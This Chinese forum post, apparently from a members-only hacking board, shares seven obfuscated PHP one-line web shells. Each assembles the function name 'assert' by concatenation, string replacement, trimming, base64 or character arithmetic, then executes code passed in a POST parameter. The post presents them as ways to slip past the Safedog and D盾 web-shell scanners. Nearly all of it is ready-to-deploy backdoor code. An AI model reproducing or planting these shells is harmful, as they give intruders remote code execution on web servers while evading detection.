前言:
  这些一句话测试时间在半月前，那时安全狗3.5停止更新，4.0刚出来，整个扫描规则都不一样了，改为引擎扫描(目前只见到啸天引擎)，且查杀结果已不利于调试，具体大家可以自行测试，感受一下差异。
以下内容需要积分高于 40 才可浏览


<?php
$xh = array('','s');
$xh1 = a.$xh[1].ser.chr('116');
@$xh1($_POST[dike]);
?>


<?php
$xh = "assert hello";
$xh1 = str_ireplace(" hello","","assert hello");
@$xh1($_POST[dike]);
?>


<?php
$xh = "assert hello";
$xh1 = rtrim($xh," hello");
@$xh1($_POST[dike]);
?>



<?php
$xh = chr(ord('b')-1);
$xh1 = array('','','s');
$xh2 = base64_decode("cw==");
$xh3 = substr("Hello ert",6);
$xh4 = $xh.$xh1[2].$xh1[2].$xh3;
@$xh4($_POST[dike]);
?>


<?php
$x=ucfirst("assert");
@$x ($_POST[dike]);
?>



<?php 
$b=substr(asassertas,2,6);
$b($_POST[hehe]);
?>



最简单的一种↓

<?$a=a.s.sert;@$a($_POST[t1est3r]);?>



1.基本都是迪科学员写的，一直未公开
2.相信大家都能看懂，不做解释了

  个人觉得无论是对于D盾还是安全狗，突破还是利用php的灵活性，此次主要就是利用各种函数(截取、替换、加解密、其他执行函数、甚至于数组)等等很多方法和思路。

希望大家都好，有一个好的心情和前程。
